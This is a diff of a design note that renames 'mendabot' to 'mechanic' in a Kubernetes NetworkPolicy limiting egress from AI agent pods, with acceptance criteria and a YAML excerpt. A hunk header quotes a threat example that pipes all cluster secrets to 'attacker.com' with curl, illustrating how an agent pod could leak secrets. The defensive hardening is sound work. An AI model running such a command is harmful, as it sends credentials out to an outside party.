@@ -28,7 +28,7 @@ kubectl get secret -A -o yaml | curl https://attacker.com -d @-
 
 No network control blocks this today.
 
-Agent Job Pods are labelled `app.kubernetes.io/managed-by: mendabot-watcher` by
+Agent Job Pods are labelled `app.kubernetes.io/managed-by: mechanic-watcher` by
 `JobBuilder.Build()` in `internal/jobbuilder/job.go` line 229. This label is the
 selector for the `NetworkPolicy`.
 
@@ -42,7 +42,7 @@ The agent legitimately needs to reach:
 ## Acceptance Criteria
 
 - [x] `deploy/kustomize/network-policy-agent.yaml` exists and is a valid `NetworkPolicy`
-- [x] The policy selects Pods with label `app.kubernetes.io/managed-by: mendabot-watcher`
+- [x] The policy selects Pods with label `app.kubernetes.io/managed-by: mechanic-watcher`
 - [x] Egress is restricted to: cluster API server (port 6443), port 443 HTTPS (GitHub
       and LLM API), and DNS (port 53 UDP/TCP)
 - [x] `kubectl apply -f deploy/kustomize/network-policy-agent.yaml --dry-run=client` succeeds
@@ -66,12 +66,12 @@ The agent legitimately needs to reach:
 apiVersion: networking.k8s.io/v1
 kind: NetworkPolicy
 metadata:
-  name: mendabot-agent-egress
-  namespace: mendabot
+  name: mechanic-agent-egress
+  namespace: mechanic
 spec:
   podSelector:
     matchLabels:
-      app.kubernetes.io/managed-by: mendabot-watcher
+      app.kubernetes.io/managed-by: mechanic-watcher
   policyTypes:
   - Egress
   egress:
@@ -157,6 +157,6 @@ kubectl kustomize deploy/kustomize/overlays/security/ | grep -c NetworkPolicy  #
 
 - [x] `kubectl apply -k deploy/kustomize/ --dry-run=client` passes (no NetworkPolicy in base)
 - [x] `kubectl kustomize deploy/overlays/security/` passes (NetworkPolicy present in output)
-- [x] `NetworkPolicy` selector matches `app.kubernetes.io/managed-by: mendabot-watcher`
+- [x] `NetworkPolicy` selector matches `app.kubernetes.io/managed-by: mechanic-watcher`
       which is the label `JobBuilder.Build()` sets on every agent Job
 - [ ] Operator note in policy YAML explains the CNI requirement
